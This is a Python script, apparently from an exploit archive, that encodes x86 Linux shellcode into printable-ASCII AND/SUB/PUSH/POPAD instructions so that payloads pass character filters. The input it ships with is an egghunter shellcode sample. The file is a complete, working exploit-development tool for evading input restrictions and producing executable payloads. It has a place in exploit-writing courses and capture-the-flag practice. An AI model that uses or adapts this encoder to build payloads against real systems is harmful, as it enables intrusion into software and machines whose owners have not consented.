#!/usr/bin/env python3

################################################################################
# INTRODUCTION
################################################################################

# Encoder Title: ASCII shellcode encoder via AND, SUB, PUSH, POPAD
# Date: 26.6.2019
# Encoder Author: Petr Javorik, www.mmquant.net
# Tested on: Linux ubuntu 3.13.0-32-generic, x86
# Special thx to: Corelanc0d3r for intro to this technique
#
# Description:
# This encoder is based on egghunter found in https://www.exploit-db.com/exploits/5342
# Core idea is that every dword can be derived using 3 SUB instructions
# with operands consisting strictly of ASCII compatible bytes.
#
# What it does?:
# Suppose that we want to push \x05\xEB\xD1\x8B (0x8BD1EB05) to the stack.
# Then we can do it as follows:
#
# AND EAX, 3F465456
# AND EAX, 40392B29         ; Two AND instructions zero EAX
# SUB EAX, 3E716230         ; Subtracting 3 dwords consisting
# SUB EAX, 5D455523         ; of ASCII compatible bytes from 0x00000000
# SUB EAX, 5E5D7722         ; we get EAX = 0x8BD1EB05
# PUSH EAX

# Mandatory bytes:
# \x25  AND EAX, imm32
# \x2d  SUB EAX, imm32
# \x50  PUSH EAX
# \x61  POPAD

# How to use:
# Edit the SETTINGS section and simply run as
# ./ASCIIencoder

# ProTip:
# Take special attention to the memory between the end of decoder instructions
# and the beginning of decoded shellcode. Program flow must seamlessly step over
# this memory. If this "bridge memory area" contains illegal opcodes they can
# be rewritten with additional PUSH instruction appended to the end of generated
# shellcode. Use for example PUSH 0x41414141.

################################################################################

import itertools
import struct
import random
import sys

assert sys.version_info >= (3, 6)


################################################################################
# CONSTANTS - no changes needed here
################################################################################

# ASCII character set
L_CASE = bytearray(range(0x61, 0x7b))   # abcdefghijklmnopqrstuvwxyz
U_CASE = bytearray(range(0x41, 0x5b))   # ABCDEFGHIJKLMNOPQRSTUVWXYZ
NUMBERS = bytearray(range(0x30, 0x3a))  # 0123456789
SPECIAL_CHARS = bytearray(
    itertools.chain(
        range(0x21, 0x30),  # !"#$%&\'()*+,-.
        range(0x3a, 0x41),  # :;<=>?
        range(0x5b, 0x61),  # [\\]^_
        range(0x7b, 0x7f)   # {|}
    )
)
ASCII_NOPS = b'\x41\x42\x43\x44'     # and many more
ALL_CHARS = (L_CASE + U_CASE + NUMBERS + SPECIAL_CHARS)

################################################################################
# SETTINGS - enter shellcode, select character set and bad chars
################################################################################

input_shellcode = (
    b'\x8b\xd1\xeb\x05\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e'
    b'\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf'
    b'\x75\xe7\xff\xe7'
)

# input_charset = U_CASE + L_CASE
input_charset = ALL_CHARS

# badchars = b''
badchars = b''

nops = ASCII_NOPS

################################################################################
# CORE - no changes needed here
################################################################################

class ASCII_Encoder(object):

    def __init__(self, shellcode_, charset_, badchars_, nops_):

        # Constructor args
        self.shellcode = bytearray(shellcode_)
        self.charset = charset_
        self.badchars = badchars_
        self.nops = nops_

        # Private vars
        self.encoded_dwords = []
        self.twos_comps = []
        self.sub_operands = []
        self.payload = bytearray()

    def encode(self):

        self.align_to_dwords()
        self.remove_badchars()
        self.derive_dwords_sub()
        self.compensate_overflow()
        self.derived_dwords_to_sub_operands()
        self.twos_comp_check()
        self.compile_payload()


    def align_to_dwords(self):

        # Input shellcode alignment to dword multiples
        nop = b'\x90'
        pad_count = 4 - (len(self.shellcode) % 4)
        if 0 < pad_count < 4:
            self.shellcode += nop * pad_count

    def remove_badchars(self):

        for badchar in self.badchars:
            self.charset = self.charset.replace(bytes([badchar]), b'')
            self.nops = self.nops.replace(bytes([badchar]), b'')

    def derive_dwords_sub(self):

        def get_sub_encoding_bytes(target):
            """
            target      x   y       z
            0x100 - (0x21+0x21) = 0xbe

            We need to select x, y, z such that it gives target when summed and all of
            x, y, z is ASCII and non-badchar
            """

            # Get all possible solutions
            all_xy = list(itertools.combinations_with_replacement(self.charset, 2))
            results = []
            for x, y in all_xy:
                z = target - (x + y)
                # Get only bytes which are ASCII and non-badchar
                if (0 < z < 256) and (z in self.charset):
                    results.append({
                        'x': x,
                        'y': y,
                        'z': z,
                        'of': True if target >= 0x100 else False
                    })

            # Choose random solution
            return random.choice(results)

        for dword in struct.iter_unpack('<L', self.shellcode):

            # 32-bit 2's complement
            twos_comp = (dword[0] ^ 0xffffffff) + 1
            self.twos_comps.append(twos_comp)

            encoded_block = []
            for byte_ in struct.pack('>L', twos_comp):

                # Will overflow be used when calculating this byte using 3 SUB instructions?
                if byte_ / 3 < min(self.charset):
                    byte_ += 0x100
                encoded_block.append(
                    get_sub_encoding_bytes(byte_))
                pass

            self.encoded_dwords.append(encoded_block)

    def compensate_overflow(self):

        # If neighbor lower byte overflow then subtract 1 from max(x, y, z)
        for dword in self.encoded_dwords:
            for solution, next_solution in zip(dword, dword[1:]):
                if next_solution['of']:
                    max_value_key = max(solution, key=solution.get)
                    solution[max_value_key] -= 1

    def derived_dwords_to_sub_operands(self):

        for dword in self.encoded_dwords:

            sub_operand_0 = struct.pack('<BBBB',
                                        *[solution['x'] for solution in dword])
            sub_operand_1 = struct.pack('<BBBB',
                                        *[solution['y'] for solution in dword])
            sub_operand_2 = struct.pack('<BBBB',
                                        *[solution['z'] for solution in dword])

            self.sub_operands.append([
                sub_operand_0,
                sub_operand_1,
                sub_operand_2
            ])

    def twos_comp_check(self):

        # Check if calculated dwords for SUB instruction give 2's complement if they are summed
        for twos_comp, sub_operand in zip(self.twos_comps, self.sub_operands):
            sup_operand_sum = sum(
                [int.from_bytes(dw, byteorder='big') for dw in sub_operand])

            # Correction of sum if there is overflow on the highest byte
            if sup_operand_sum > 0xffffffff:
                sup_operand_sum -= 0x100000000
            assert (twos_comp == sup_operand_sum)

    def compile_payload(self):

        def derive_bytes_and():

            all_xy = list(itertools.combinations_with_replacement(self.charset, 2))
            results = []
            for x, y in all_xy:
                if x + y == 127:
                    results.append((x, y))
            while 1:
                yield random.choice(results)

        def derive_dwords_and():

            gen_bytes = derive_bytes_and()
            bytes_ = []
            for _ in range(0, 4):
                bytes_.append(next(gen_bytes))

            return bytes_

        # POPAD n times to adjust ESP.
        # Decoded shellcode must be written after the decoder stub
        self.payload += b'\x61' * (len(self.encoded_dwords))

        for sub_operand in reversed(self.sub_operands):

            # Clearing EAX instructions with AND instructions
            bytes_ = derive_dwords_and()

            self.payload += b'\x25' + struct.pack('<BBBB',
                                             *[byte_[0] for byte_ in bytes_])
            self.payload += b'\x25' + struct.pack('<BBBB',
                                             *[byte_[1] for byte_ in bytes_])

            # Encoded shellcode with SUB instructions
            self.payload += b'\x2d' + sub_operand[0][::-1]
            self.payload += b'\x2d' + sub_operand[1][::-1]
            self.payload += b'\x2d' + sub_operand[2][::-1]

            # Push EAX
            self.payload += b'\x50'

        # Pad with NOPs
        self.payload += bytes(random.choices(self.nops, k=9))

    def print_payload(self):

        print('Original payload length: {}'.format(len(input_shellcode)))
        print('Encoded payload length: {}'.format(len(self.payload)))
        print('hex:  ',
              '\\x' + '\\x'.join('{:02x}'.format(byte) for byte in self.payload))


if __name__ == '__main__':

    encoder = ASCII_Encoder(input_shellcode, input_charset, badchars, nops)
    encoder.encode()
    encoder.print_payload()